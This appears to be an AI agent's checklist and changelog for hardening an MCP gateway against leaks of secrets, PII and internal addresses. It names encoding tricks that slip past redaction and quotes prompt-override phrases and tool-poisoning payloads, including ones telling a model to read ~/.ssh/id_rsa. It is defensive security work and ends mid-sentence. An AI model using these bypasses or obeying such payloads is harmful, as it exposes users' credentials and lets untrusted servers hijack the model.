# Claude Code Ralph — MCP Hardening BACKSTOP (edits-with-memory-log; 50–100 iters)
# RULE: every change → log to Ruflo + AGENTS.md + .cursor/rules + docs/mcp/HARDENING_CHANGELOG.md (§0).

## G0 — Setup + memory protocol
- [x] 0. Init the four-memory changelog; join hive; enforce MCP_SANDBOX_RUNTIME=runsc.
      CHG-0001 (2026-07-02): created docs/mcp/HARDENING_CHANGELOG.md (§0 protocol + template),
      .cursor/rules/mcp-hardening-changelog.mdc, AGENTS.md pointer. Audited runsc fail-closed
      enforcement in docker_manager._resolve_runtime() (docker_manager.py:343-359) — mechanism
      present & correct; prod must set MCP_SANDBOX_RUNTIME=runsc + MCP_SANDBOX_RUNTIME_REQUIRED=true
      (env-set verification tracked under G3 item 12).

## G1 — Backstop audit (what did the other sessions do/miss?)
- [x] 1. Review the cursor-mcp / stress / frontend branches + shared memory; list mistakes, omissions,
      regressions, and incomplete work → docs/mcp/BACKSTOP_FINDINGS.md.
      CHG-0002 (2026-07-02): 6-auditor parallel workflow → docs/mcp/BACKSTOP_FINDINGS.md (24 findings:
      13 high/8 med/1 low). Signal = OMISSIONS/fail-open parity gaps, not cross-session regressions.
      3 load-bearing claims backstop-verified (SSE unscanned egress; dead cross-tenant oracle
      `for fs in []`; 3-org=15-sandbox ceiling). PRIORITY ORDER for next items:
        #1 G2 item 2 — fail-closed byte-verified RESULT redaction (SSE /ext-proxy + string/structuredContent
           shapes + fail-OPEN result-floor all egress raw PII/secret TODAY — the most direct leak).
        #2 G2 item 3 — per-actor authz + field-redaction on stdio/ws adapter path (+posture-vs-rule block
           downgrade, +allowlist-scope inversion, +org_mcp_tool_call bypasses allowlist/cap).
        #3 G2 item 5 — unify tag vocab onto ComplianceTag.code + tag→action enforcement + tag input-blocks.
        #4 G3 item 12 — runsc REQUIRED + network-level egress default-deny (shipped default = runc+open NAT).
        #5 G3 item 7 — broker RPC for http/sse/ws (only stdio sandboxed) + fix host-run shared-bridge fallback.
        #6 G5 item 19 — replace dead cross-tenant oracle + capture real egress bytes + aidefence cross-check.
        #7 G5 14/15/18/16/17/20 — build true-scale stress (300-500 sandboxes, 5k-10k calls, chaos/soak/bomb/peak).
        #8 G6 item 21 — emit redact signal, Redact badge+field list, fix StatCard under-count, extend Playwright, fix mojibake.

## G2 — 1.4 Context Assembly & MCP Guardrails (log every edit)
- [x] 2. Field-level redaction of MCP tool RESULTS (byte-verified, fail-closed).
      DONE via CHG-0003+0004+0005 (2026-07-02). Result redaction is byte + independent-aidefence-oracle
      verified across ALL bare routes (rest/internal/ext streaming+non-streaming) and ALL result shapes
      (content/structuredContent/list/str); fail-CLOSED on the bare routes, fail-SAFE (500, no raw egress)
      on the main org_mcp_jsonrpc path (audited: scan exception propagates → 500, raw returned only after
      a successful scan). Gate: test_mcp_bare_proxy_scan.py 14 passed; broad sweep 362 passed.
      DEFERRED (NOT leaks): main-path graceful-block vs 500 (availability enhancement); per-actor
      FIELD-level RBAC masking → tracked under item 3.
      History — CHG-0003 (fail-closed result-scan error). `_scan_tool_result_floor`
      (mcp_proxy.py ~690-780) now blocks (SCAN_ERROR + result_scan_failclosed) instead of forwarding RAW
      on a scan exception — BOTH the primary output scan AND the redaction-floor re-scan. +2 byte-level
      tests (scanner patched to raise → raw PII absent + blocked); test_mcp_bare_proxy_scan.py 10 passed,
      broad sweep 323 passed.
      CHG-0004 (2026-07-02): (a) SSE buffer-and-scan DONE — ext_mcp_proxy buffers finite tools/call SSE,
      scans/redacts each data-frame result (_scan_reframe_sse_tool_result), re-emits masked or blocks;
      non-tools/call SSE passes through (no hang). 3 SSE tests replace the leak-pinning test;
      test_mcp_bare_proxy_scan.py 12 passed, broad sweep 342 passed; independent aidefence oracle:
      masked egress hasPII=false, raw hasPII=true.
      REMAINING before [x]: (b) non-streaming string/structuredContent result shapes unscanned;
      (c) audit main org_mcp_jsonrpc inline result path (~2265/2451) for the same fail-open.
      CHG-0039 (2026-07-02): closed the last ext-proxy SSE unscanned path. CHG-0004 buffered+scanned SSE ONLY
      for tools/call; every OTHER method's SSE streamed through UNSCANNED — so a resources/read / prompts/get
      result (finite, can carry PII/secrets from the external server, e.g. a code file with an API key)
      egressed RAW over SSE. Added _EXT_FINITE_RESULT_METHODS (tools/call + resources/* + prompts/* +
      tools/list) + _ext_scan_result; the SSE branch now buffers+scans those finite request/response methods,
      while notifications/subscriptions still stream through live (no bounded result; buffering could hang).
      The non-streaming JSON branch already scanned any result; the org path rejects these methods (-32601), so
      this closes the only reachable unscanned resource-content path. +2 tests; test_mcp_bare_proxy_scan.py 24
      passed, broad sweep 1085 passed.
      CHG-0043 (2026-07-02) [renumbered from CHG-0040 — collided w/ P4.13 Blocker 2]: closed the LAST unscanned egress vector on ext_mcp_proxy. The scan only inspected
      the `result`; a JSON-RPC ERROR response (no result) egressed UNSCANNED — an untrusted external server
      could leak a secret in an error message (e.g. a postgres:// connection string). Both ext-proxy paths
      (non-streaming branch + _scan_reframe_sse_tool_result) now scan `error` when there's no result:
      _scan_tool_result_floor walks message/data + masks any detected secret/PII (redact-only), fail CLOSED
      (withhold) on scan error; notifications pass through. +2 tests (connection-string secret masked in a
      non-streaming error AND an SSE error frame); test_mcp_bare_proxy_scan.py 26 passed, broad sweep 1087
      passed. ext-proxy egress now FULLY scanned: result (all shapes + tools/resources/prompts) + error,
      streaming + non-streaming.
      CHG-0041 (2026-07-02): (1) AUDITED gateway MCP logging = CLEAN (no PII/secret to logs: mcp_proxy logs
      only target_url + exception messages; scan orchestrator logs only exceptions; metrics logs
      method/model/token-counts; audit raw-store off by default). (2) Extended the ext-proxy INBOUND credential
      block from tools/call-only to prompts/get (same params.arguments shape; _EXT_ARG_SCAN_METHODS) — an
      accidental credential in prompt args no longer egresses raw to the external server. resources/read
      EXCLUDED (its param is a URI; blocking a legit https://user:token@host would break authed reads). Removed
      the dead _ext_is_tools_call flag. +1 test; test_mcp_bare_proxy_scan.py 27 passed, broad sweep 1088 passed.
      CHG-0042 (2026-07-02): OAuth secret at rest. OAuth flow state (PKCE code_verifier, CSRF state) +
      access/refresh tokens persisted to Redis as PLAINTEXT JSON. Added optional Fernet at-rest encryption
      in mcp_oauth_proxy.py (_oauth_cipher/_enc_dumps/_enc_loads, gated on MCP_OAUTH_ENCRYPTION_KEY):
      default OFF = byte-unchanged plaintext; key set = new writes encrypted (gAAAAA) while legacy plaintext
      still reads (no orphan); invalid key -> plaintext fallback (never breaks flow). Wired _flow_save/
      _flow_pop/_token_save/_token_load. OAuth callback re-audited CLEAN (CSRF+PKCE via _flow_pop, SSRF
      _assert_safe_url, no redirect follow). +4 tests (test_mcp_oauth_encryption.py); broad sweep 1092 passed.
      CHG-0046 (2026-07-02, HIGH — result-redaction FAIL-OPEN re-opened in item 2): the two-tier scanner
      flattens each scan target via _safe_json (NUMBER/LIST/OBJECT value IS scanned) and redacts via
      setter(new_text). For key_path/simple-key targeting a NON-STRING value the setter was a NO-OP
      (mcp_scan_targets.py:108 dot-path, :123 simple-key) → a detected secret/PII was reported redacted
      (result_redacted=True) yet egressed RAW; and because result_redacted flips the returned object identity,
      the E12 result-floor was BYPASSED (scanned no longer `is result_content`). FIX: bind the SAME real
      mutators the string targets use (dot-path _mutate_dot_path via hoisted _make_setter; simple-key
      node[key]=new) so redaction replaces the value; clean values untouched (setter fires only when
      new_text!=text). Entire-mode default already correct. +4 tests (3 unit setter-mutation + 1 e2e
      byte-assert). Gate: 39 scan-target/orchestrator + 1098 gateway passed. Evidence:
      mcp-parallel/findings/backstop-p2-nonstring-redact-setter/finding.md. FOLLOW-UP: general fail-closed
      OUTPUT byte-check in _scan_tool_result_floor (block if any detected value survives the scrub).
      CHG-0047 (2026-07-02, defense-in-depth — IMPLEMENTS the CHG-0046 follow-up): scan_mcp_payload set
      result_redacted=True whenever new_text!=text regardless of whether the setter actually mutated the
      payload — so a residual no-op scrub (_mutate_dot_path best-effort on exotic nested-list paths) could
      egress the raw value while claiming redaction. FIX: in the Tier-1 redact branch, snapshot
      _safe_json(state_ref[0]) before/after setter(new_text); if the payload BYTES are unchanged → no-op
      scrub → tier1_blocked=True (+ noop_scrub_failclosed trace) → fail CLOSED (block), never egress
      un-scrubbed. General/precise (bytes, no out-of-scope FP)/cheap; a real setter changes bytes → not
      blocked. +2 tests. Gate: 41 scan-orchestrator/target + 1100 gateway passed (ZERO spurious blocks).
      With CHG-0003 + CHG-0046 the redaction path is now fail-closed on scan-error, setter-no-op, AND
      non-string shapes. Evidence: mcp-parallel/findings/backstop-p2-noop-scrub-failclosed/finding.md.
      CHG-0054 (2026-07-02, HIGH secret leak — found via adversarial 1.4 verification w/ aidefence oracle):
      redact_all masked ONLY the -----BEGIN PRIVATE KEY----- header line (-> [PRIVATE_KEY]), leaving the base64
      key BODY + -----END----- intact — the body IS the secret, and [PRIVATE_KEY] is trivially replaced with
      the fixed BEGIN line to reconstruct the key. Old pattern only matched RSA (EC/DSA/OPENSSH egressed raw
      entirely). Root cause: PII_PATTERNS private_key_header runs first + masks the header, so the later
      header-only private_key_block never matched the multi-line body. FIX: private_key_header now matches the
      ENTIRE PEM block (generic RSA/EC/DSA/OPENSSH prefix; BEGIN..END or BEGIN..base64-run if truncated) ->
      [PRIVATE_KEY]; prose "loads a private key" not redacted (no FP). ORACLE NOTE: aidefence has NO PEM-key
      recognizer (piiFound:false on raw AND redacted) — NOT a substitute oracle; confirmed via gateway
      detect_pii + byte inspection. patterns.py + test_private_key_redaction.py (+5). Gate: 5 pk-redaction +
      74 redaction-adjacent + 1122 gateway passed. Evidence: mcp-parallel/findings/backstop-p2-private-key-body-leak/finding.md.
      FOLLOW-UP: detect_secrets inventory omits private keys (detect_pii covers them) — cross-plane unification.
      CHG-0055 (2026-07-02, MEDIUM — secret-inventory gap, found continuing the CHG-0054 adversarial 1.4
      verification): the inventory redacted password=/secret=/token= assignments but NOT
      api_key=/apikey=/access_key= — so API_KEY=<value> whose value didn't match a provider format (e.g.
      sk-abcdef0123456789ABCDEFxyz, 24 chars, below the openai 32 threshold) egressed UNMASKED (api_key=/
      apikey:/access_key=/api-key = all cases). FIX: new api_key_assignment =
      (?:api[_-]?key|access[_-]?key)[:=]<val> reusing the _TOKEN_VALUE FP guard (>=8 chars w/ a digit, not
      prose) so api_key=none / DEBUG=true stay FP-safe; tagged SECRET; masked via _mask_secret_assignment ->
      api_key=***; detect_secrets now flags api_key_assignment. patterns.py + test_api_key_assignment_redaction.py
      (+13). Gate: 13 api-key + 1135 gateway passed. Evidence: mcp-parallel/findings/backstop-p2-api-key-assignment-gap/finding.md.
      CHG-0056 (2026-07-02, MEDIUM — URL-encoding obfuscation bypass; found continuing the CHG-0054/0055
      adversarial 1.4 verification of the encoding-obfuscation surface): redact_all de-obfuscated base64/hex/
      url-safe-b64/double-b64 (all caught) but did NOT URL-decode — so john.doe%40example.com (email in a URL
      query param) / %-encoded SSN (123%2d45%2d6789) broke the raw patterns and egressed (trivially
      recoverable). FIX: percent-decode pass in _redact_obfuscated — unquote each %XX-token (bounded
      _MAX_URL_DECODE_TOKENS=32) and mask the whole token [ENCODED_SECRET_REDACTED] when the decoded form
      matches PII/secret; benign percent text (50%20off / C%3A%5Cpath / 95% / ?p=2%2C3) untouched. patterns.py
      + test_url_encoding_redaction.py (+11). Gate: 11 url-enc + 1158 gateway passed. RESIDUAL (CLOSED by
      CHG-0060 2026-07-02): _MAX_DECODE_TOKENS=12 base64 cap let a crafted result hide an encoded secret
      past 12 decoy tokens. CHG-0060 replaced the token-COUNT cap with a decoded-BYTE budget
      (_MAX_DECODE_TOTAL_BYTES=262144) over the _CANON_MAX_LEN-capped input (base64/hex + url), so every
      encoded token in the scan window is now decode-scanned (base64/hex past 12 decoys + url past 32 all
      masked); +7 tests; gate 7 decoy-bypass + 1214 gateway passed. New residual: content beyond
      _CANON_MAX_LEN=20000 not obfuscation-scanned (plain PII beyond still raw-masked). Evidence:
      mcp-parallel/findings/backstop-p2-url-encoding-obfuscation/finding.md + backstop-p2-decode-decoy-bypass/finding.md.
      CHG-0057 (2026-07-02, fail-closed byte-truth + E2E verification): VERIFIED the MCP tool-result redaction
      path (scan_mcp_payload -> _scan_text_tier1 PII/secret branch) uses detect_pii/detect_secrets/redact_all
      from patterns.py — so CHG-0054/0055/0056 protect real tool results E2E (tier1 patterns-based; Presidio =
      tier2 only). GAP: the tier1 redact byte-check (block if a detected value survives the scrub) checked ONLY
      ip_leak, ASSUMING pii/secret always covered (CHG-0054 disproved that for a masker bug). FIX: byte-verify
      ALL detected categories — _detected_values = pii+secrets+ip_leak; any survivor -> block (fail-closed). No
      FP: redact_all replaces every detected match (verified over the full battery, zero would-be false blocks).
      +2 tests (no-op redact_all -> detected email survives -> block; real redact_all -> masked, not blocked).
      Gate: 2 chg0057 + 1160 gateway passed (excl. another session's untracked broken
      test_mcp_enforcement_block_recording.py = undefined _rest_request helper, unrelated). Evidence:
      mcp-parallel/findings/backstop-p2-tier1-byte-verify-all/finding.md.
      CHG-0058 (2026-07-02, HIGH — encoded internal-network-address leak; found continuing the
      CHG-0054/0055/0056/0057 adversarial obfuscation sweep): redact_all de-obfuscated base64/hex (G2) + URL
      (CHG-0056) blobs but the decode branches in _redact_obfuscated checked only pii/secrets, NOT
      detect_ip_leakage — so an internal IP/host/URL inside an encoded blob (base64("db.internal:5432"),
      base64("http://192.168.50.123:8080/admin"), %-encoded internal URL) egressed verbatim. SECONDARY gap: the
      base64 gate _B64ISH_RE needs {12,} chars, so a bare short internal IPv4 (10.1.2.3 -> MTAuMS4yLjM=, 11
      chars) slipped under (hex short-IPs already covered: 8 bytes=16 hex >= {8,} floor). FIX (patterns.py): (1)
      _dec_has_infra() network-keys-only added to the base64/hex + url-decode branches -> mask whole token
      [ENCODED_SECRET_REDACTED]; file-path keys excluded (matches redact_all scope). (2) _SHORT_B64_RE +
      _iter_short_b64_infra() — dedicated 8..11-char short-token pass, network-key-only (does NOT touch
      detect_pii/detect_secrets), maximal-run-pinned, bounded. NO FP: _IP_LEAKAGE_EXAMPLE_ADDRS textbook
      carve-out preserved on the decode path; encoded file paths untouched; benign short-b64 battery
      zero-changed. Integrates with CHG-0057 byte-verify (ip_leak union fails closed on a survivor). +13 tests.
      Gate: 13 encoded-infra + 1176 gateway passed, 0 failed. Evidence:
      mcp-parallel/findings/backstop-p2-encoded-infra-leak/finding.md.
      CHG-0071 (2026-07-02, HIGH — provider secret-format DETECTION gap, found via an adversarial
      redact_all secret-format sweep of ~20 real credential formats): 4 egressed UNMASKED AND weren't
      flagged by detect_secrets — Anthropic sk-ant-… (OpenAI sk- family caught but ant not in the
      alternation), SendGrid SG.x.y, GitLab glpat-…, Slack webhook hooks.slack.com/services/…. SUBTLE:
      adding to CREDENTIAL_EXPOSURE_PATTERNS masks (redact_all) but does NOT make detect_secrets flag them,
      and the MCP tier1 scan uses detect_secrets to DECIDE enforcement -> a result whose only sensitive
      content is such a key triggers NO redaction and egresses raw. FIX: added all 4 to SECRET_PATTERNS
      (iterated by both detect_secrets + redact_all) + COMPLIANCE_TAG_MAP (SECRET). Near-zero FP. +10 tests.
      Gate: 10 + 1266 gateway passed, 0 failed. Evidence:
      mcp-parallel/findings/backstop-p2-provider-secret-formats/finding.md.
      CHG-0072 (2026-07-02, HIGH — 2nd adversarial secret-format sweep): 11 more real credential formats
      egressed UNMASKED — AWS STS temp key ASIA… (aws_access_key was AKIA-only), DigitalOcean dop_v1_,
      Shopify shp{at,ss,ca,pa}_, Square sq0{atp,csp,idp}-, Databricks dapi, Vault hv{s,b}., Figma figd_,
      Telegram <id>:AA…, PyPI pypi-, Linear lin_api_, Mailgun key-<32hex>. FIX (patterns.py): widened
      aws_access_key (PII_PATTERNS/detect_pii) to (?:AKIA|ASIA); added 10 tokens to SECRET_PATTERNS
      (detect_secrets+redact_all) + COMPLIANCE_TAG_MAP (SECRET); Telegram pattern allows the optional `bot`
      URL prefix. Near-zero FP. +18 tests. Gate: 18 + 1284 gateway passed, 0 failed. Evidence:
      mcp-parallel/findings/backstop-p2-more-provider-secrets/finding.md.
      CHG-0073 (2026-07-02, MEDIUM — 3rd adversarial sweep, IP-LEAKAGE surface; closes a fail-OPEN): the
      redact_all/detect_ip_leakage sweep found IP_LEAKAGE_PATTERNS was IPv4-RFC1918-ONLY, so a tool RESULT
      with internal IPv6 (ULA fc00::/7, link-local fe80::/10), a cloud-metadata/link-local IPv4
      (169.254.169.254 IMDS — hands out IAM creds; the exact SSRF target the dial guards CHG-0065/0067
      block) or CGNAT (100.64.0.0/10) egressed RAW (redact_all no-op, detect empty). SUBTLE FAIL-OPEN:
      _redact_all_raw masks infra via a HARDCODED key tuple ("internal_ipv4","internal_hostname",
      "internal_url"), NOT by iterating the dict — so a dict-only add makes detect_ip_leakage FLAG the leak
      (tier1 decides block/redact) while redact_all leaves it RAW → "report redacted while forwarding raw".
      FIX (patterns.py, ALL 4 points so detect==redact==tag==encoded-parity): added internal_ipv6 (anchored
      on the internal first hextet — a 2-hex MAC group / bare hex blob / HH:MM:SS timestamp never match;
      loopback ::1/127.x intentionally NOT flagged) + link_local_ipv4 (169.254/16 incl. IMDS + 100.64/10
      CGNAT) to (1) IP_LEAKAGE_PATTERNS→detect, (2) the redact tuple→mask, (3) _INFRA_NETWORK_KEYS→
      encoded-infra parity, (4) COMPLIANCE_TAG_MAP→["INFRA"]. Linear-time (no ReDoS), ~0 FP; RFC1918 control
      + goldens unchanged. +21 tests. Gate: 21 + 1305 gateway passed, 0 failed. Independent oracle:
      aidefence_scan piiFound:false on the IMDS URL + ULA IPv6 (a generic scanner is BLIND to infra-leak →
      the gap is real; purpose-built detect_ip_leakage required). Evidence:
      mcp-parallel/findings/backstop-p20-internal-ipv6-metadata-leak/finding.md.
      CHG-0074 (2026-07-02, MEDIUM–HIGH — devil's-advocate on CHG-0073: were the IP patterns WIRED into the
      live result-enforcement path, or just padding patterns.py?): tracing _scan_tool_result_floor →
      _mcp_security_scan → scan_mcp_payload found TWO fail-opens. GAP1: the orchestrator (_scan_text_tier1)
      DETECTS+TAGS ip_leakage (INFRA) but only REDACTS under enforcement=="redact"; under the DEFAULT
      tag/flag/monitor posture returns the result UNMUTATED, and the mcp_proxy E12 result-redaction floor
      (upgrades tag→redact) was gated on _findings_have_secret_or_pii — pii/secret ONLY, EXCLUDING the whole
      ip_leakage class. Proven E2E at the real floor under default `tag`: PII/secret floored (safe) but
      169.254.169.254 (IMDS), fc00::1234:5678, AND even pre-existing RFC1918 10.10.5.7 egressed RAW. GAP2: the
      floor re-scan (enforcement_override="redact") BLOCKS when a value redact_all can't mask survives (a
      private FILE PATH beside the leak), but all 3 floor sites IGNORED that blocked flag → swallowed block,
      raw forward (also hit PII+file-path). FIX (mcp_proxy.py + mcp_scan_orchestrator.py): McpFinding gains
      matched_kinds (+to_finding_dict); new _findings_have_infra_network_leak (network keys via
      _INFRA_NETWORK_KEYS ONLY — file paths stay flag-tier, never force-block a benign code result) OR'd into
      all 3 floor triggers; all 3 sites PROPAGATE the floor-block fail-closed. Net: internal-network addrs in
      results MASKED under default posture; file-path-only stays raw; network|PII + file-path fails CLOSED.
      +11 tests (drive the REAL floor). Gate: 11 + 1316 gateway passed, 0 failed; broker -k "not websocket"
      108 passed. Evidence: mcp-parallel/findings/backstop-p20-ipleak-result-floor/finding.md.
      CHG-0075 (2026-07-02, HIGH — devil's-advocate on the detect_* completeness): the MCP tier-1 scan
      (mcp_scan_orchestrator._scan_text_tier1) ran detect_pii/secrets/ip_leakage but NOT
      detect_credential_exposure. CREDENTIAL_EXPOSURE_PATTERNS is a SEPARATE dict (bearer/connection_string/
      exposed_password/private_key_block/github_fine_grained_pat/stripe_key/azure_storage_key/twilio_api_key/
      gcp_service_account_key/slack_token/jwt) NOT read by detect_secrets. redact_all masks it, but the MCP
      scan uses detect_* to DECIDE → a credential whose ONLY match was a CREDENTIAL_EXPOSURE kind (Stripe
      sk_live_, Twilio SK<32hex>, Azure AccountKey=, a DB conn-string password) was never DETECTED → egressed
      RAW on a tool RESULT (verified E2E at default `tag`) and passed unblocked in tool ARGS to an untrusted
      upstream. Same wrong-dict class as CHG-0071. PART B: 7 of those keys had NO COMPLIANCE_TAG_MAP entry →
      get_compliance_tags [] → never tagged SECRET. FIX: (a) _scan_text_tier1 imports+calls
      detect_credential_exposure, folded into the detect branch (kinds/matched_kinds/byte-verify + threat
      precedence pii>secret/cred>ip_leakage → drives result floor + arg force-block); (b) COMPLIANCE_TAG_MAP
      += the 7 keys → ["SECRET","SOC2"]. Net: Stripe/Twilio/Azure/conn-string/GCP-SA in results MASKED+tagged
      SECRET; same in args force-blocked; benign no-FP. +11 tests. Gate: 11 + 1327 gateway passed, 0 failed;
      broker -k "not websocket" 108 passed. Evidence: mcp-parallel/findings/backstop-p2-cred-exposure-mcp-scan/finding.md.
      CHG-0076 (2026-07-02, MEDIUM–HIGH — devil's-advocate on chat-vs-MCP scan parity): the chat OUTPUT
      scanner (scanner._scan_output_sync, G33/G35) decodes text-encoding variants via
      _decode_text_encoding_variants (HTML char refs &#..;, percent, \u/\x) but the MCP orchestrator tier-1
      (_scan_text_tier1) had NO such check. detect_secrets folds base64/hex, but a SECRET/CREDENTIAL/
      INTERNAL-NETWORK-IP hidden by a TEXT-encoding dodges the raw regexes, and redact_all can't mask an
      encoded run → an encoded credential/internal IP in a tool RESULT egressed (verified: HTML-entity +
      percent-encoded sk-ant + 10.0.0.5 NOT flagged by the MCP floor while the chat path caught them) and a
      markdown/HTML MCP client decodes it back = exfil past the firewall by an untrusted upstream (same class
      in ARGS). FIX (mcp_scan_orchestrator.py): _scan_text_tier1 decodes the variants; a decoded SECRET/
      CREDENTIAL/internal-NETWORK-IP the raw lacked → threat_type="secret" + BLOCK (fail-closed, non-monitor;
      redact_all can't mask an encoded run; mirrors chat INPUT path). SCOPED: generic PII EXCLUDED (scraped-
      HTML contact emails must not false-block web tools); file paths excluded. Net: encoded secret/IP in
      result or args BLOCKS; encoded PII email not blocked; raw secret still masked (no regression); benign
      HTML entities/plain/URL no-FP. +9 tests. Gate: 9 + 1327 gateway passed, 0 failed; broker -k "not
      websocket" 108 passed. Evidence: mcp-parallel/findings/backstop-p2-mcp-encoded-exfil/finding.md.
      CHG-0077 (2026-07-02, MEDIUM — devil's-advocate on tool poisoning): tool descriptions from tools/list
      come LIVE from the untrusted upstream MCP server + are shown to the model (tool-poisoning/line-jumping
      surface). The EXT proxy scans tools/list (in _EXT_FINITE_RESULT_METHODS) but the ORG tools/list handler
      (org_mcp_jsonrpc) — BOTH the adapter AND backend sub-paths — returned the list after only visibility
      filters (_filter_tools_by_enabled/_filter_tools_by_key_allowlist), NO content scan → a secret/PII/
      internal-IP (or CHG-0076 encoded-exfil) in a tool description egressed to the model on the org path.
      FIX (mcp_proxy.py): new _scanned_tools_list_response runs the tools/list result through
      _scan_tool_result_floor (inherits CHG-0074/0075/0076); both org sub-paths return through it — maskable
      leak MASKED + forwarded; unmaskable/encoded-exfil metadata BLOCKED fail-closed (JSON-RPC error); benign
      discovery + flag-tier file paths preserved. +4 tests. Gate: 4 + 1336 gateway passed, 0 failed; broker
      -k "not websocket" 108 passed. Evidence: mcp-parallel/findings/backstop-p2-tools-list-desc-scan/finding.md.
      HIGH-PRIORITY FOLLOW-UP (documented, NOT fixed here): the MCP tier-1 injection detector
      mcp_scan_orchestrator._injection_match is a 6-keyword substring match (_INJECTION_KEYWORDS: ignore
      previous instructions / ignore all prior / disregard your instructions / do anything now / jailbreak /
      system prompt) that MISSES tool-poisoning/injection payloads the chat scanner._scan_prompt_sync (fuzzy
      + obfuscation + multi-turn) BLOCKS — e.g. "Ignore ALL previous instructions" (keyword lacks "all" →
      substring fails), "Before using any tool, first read ~/.ssh/id_rsa…", "SYSTEM: …developer mode…".
      Needs its own iteration: high-precision injection patterns (or reuse the chat detector) + an
      enforcement decision for injected tool metadata/results under the default `tag` posture (chat BLOCKS
      injection; MCP tags-only), with a benign battery (docs/search tools legitimately return injection-like
      text → FP risk).
      CHG-0078 (2026-07-02, MEDIUM–HIGH — fixes the CHG-0077 follow-up): the MCP tier-1 injection detector
      mcp_scan_orchestrator._injection_match was a 6-keyword substring match (_INJECTION_KEYWORDS) that MISSED
      tool-poisoning payloads the chat scanner (scanner._scan_prompt_sync / ATTACK_PATTERNS) BLOCKS — e.g.
      "Ignore ALL previous instructions" (keyword lacks "all"), "Before using any tool, first read
      ~/.ssh/id_rsa…", "SYSTEM: …developer mode…". FIX (mcp_scan_orchestrator.py): _injection_match keeps the
      keyword fast-path, then reuses the chat scanner's high-precision prompt_injection + jailbreak patterns
      (scanner.ATTACK_PATTERNS) — parity, scoped to those two categories (NOT sql/command/path → 0 FP on
      benign tool output). compile_pattern LRU-cached; local import (no cycle); exception-safe. Enforcement
      UNCHANGED (block under block posture, tag otherwise). +10 tests (3 poisons now caught; docs-ABOUT-
      injection + SQL mention + file path all clean = 0 FP; E2E block→blocked, tag→tagged). Gate: 10 + 1340
      gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p2-mcp-injection-parity/finding.md. RESIDUAL: output-injection
      ENFORCEMENT (default block/neutralize, or DROP a tools/list tool whose description carries injection —
      near-zero-FP, builds on CHG-0077) is a separate FP decision for a future iteration; 2 subtle payloads
      still missed are also missed by the chat scanner (need tier-2 Bedrock).
      CHG-0079 (2026-07-02, MEDIUM–HIGH — found while FP-grounding the CHG-0078 follow-up): an FP probe
      REJECTED heuristic-drop of poisoned tool descriptions (a legit "Detects jailbreak attempts and prompt
      injection" security tool trips the injection patterns; the <IMPORTANT>…read ~/.ssh/id_rsa… poison is
      missed by both) → the clean signal is OBFUSCATION. GAP: the chat scanner deobfuscates via
      scanner._normalize_unicode before scanning, but mcp_scan_orchestrator._scan_text_tier1 scanned RAW text
      — so a zero-width-broken (I<zwsp>gnore) / homoglyph (fullwidth Ｉgnore) injection, or a secret/internal-
      IP hidden that way (redact_all doesn't strip zero-width), bypassed the MCP firewall while a markdown/
      model client reads the deobfuscated value. FIX (mcp_scan_orchestrator.py): _scan_text_tier1 computes
      _deob=_normalize_unicode(text) (strip zero-width & bidi + fold homoglyphs + decode unicode-tags + drop
      combining marks) and runs _injection_match on it + adds it to the CHG-0076 hidden-secret/cred/internal-
      IP variant probe (obscured secret/IP → BLOCK fail-closed). ASCII fast-path; local import (no cycle);
      injection enforcement unchanged. Extends CHG-0076 to a 2nd obfuscation channel. +8 tests; ZERO FP
      (emoji ZWJ 👨‍👩‍👧 + Japanese + accents + ASCII all clean — detection-only probe). Gate: 8 + 1350 gateway
      passed, 0 failed; broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p2-mcp-unicode-deobfuscation/finding.md. RESIDUAL: heuristic-drop of
      poisoned tool descriptions REJECTED on FP grounds; injection under default tag posture remains
      tagged-but-forwarded (CHG-0078 residual).
      CHG-0080 (2026-07-02, MEDIUM — devil's-advocate on model-facing surfaces): the MCP `initialize` result
      carries an `instructions` field the spec treats as model-facing guidance ("analogous to a system
      prompt") + serverInfo — a tool-poisoning/injection + metadata surface like tool descriptions (CHG-0077).
      ORG path SAFE (org_mcp_jsonrpc SYNTHESIZES initialize; no upstream instructions forwarded), but the EXT
      transparent proxy (ext_mcp_proxy) scans a result only when the method is in _EXT_FINITE_RESULT_METHODS —
      and `initialize` was NOT in it → the upstream's initialize instructions/serverInfo egressed RAW to the
      model. FIX (mcp_proxy.py): added "initialize" to _EXT_FINITE_RESULT_METHODS → the finite handshake
      result now routes through the result floor (inherits CHG-0074/0075/0076/0079 + injection detect/tag).
      initialize ARGS not scanned (client-provided). +5 tests (secret+IP in instructions masked+tagged;
      zero-width-hidden secret blocked fail-closed; injection detected; benign intact). Gate: 5 + 1358 gateway
      passed, 0 failed; broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p2-ext-initialize-instructions/finding.md. RESIDUAL: injection in
      instructions detected+tagged but not removed under default tag posture (CHG-0078 residual).
      CHG-0081 (2026-07-02, MEDIUM — audit-completeness, devil's-advocate on the …→tag→AUDIT chain end):
      CHG-0077's _scanned_tools_list_response masks/blocks a poisoned tool-description leak but had ZERO
      _record_gateway_event calls (tools/call audits heavily) → a tool-poisoning BLOCK or a secret/PII/IP
      REDACT on the discovery path was INVISIBLE to the MCPEvent audit/SIEM trail (asymmetric with tools/call
      + ext-proxy audit CHG-0068/0070). FIX (mcp_proxy.py): _scanned_tools_list_response now audits block XOR
      redact (tool_name=tools/list, reason=tools_list_metadata_scan, compliance tags, findings, + a threaded
      per-request correlation id via a new request_id param = _mcp_request_correlation_id(request, msg_id)
      from both org sub-paths); a clean tools/list is NOT audited (no noise). Fire-and-forget / no-op without
      org. +3 tests (secret/IP → audited redact w/ tags + request-id; encoded-exfil → audited block; benign →
      NO audit). Gate: 3 + 1363 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p9-tools-list-audit/finding.md.
      CHG-0082 (2026-07-02, MEDIUM — bare-REST parity, applying the CHG-0081 audit + CHG-0077 scan lens to the
      other REST routes): (A) org_mcp_tool_call (REST POST .../tools/call) audited a result BLOCK but swapped
      a REDACTED result in SILENTLY (no _record_gateway_event) → a secret/PII/IP masked on the primary
      bare-REST tool-call path was invisible to audit/SIEM (asymmetric with the block branch + org jsonrpc).
      (B) org_mcp_tools_list (REST GET .../tools) FILTERED but NEVER scanned tool descriptions (JSON-RPC
      tools/list already scans, CHG-0077) → a secret/PII/IP or tool-poisoning payload in a description
      egressed on this REST endpoint. FIX (mcp_proxy.py): (A) audit decision=redact before swapping the masked
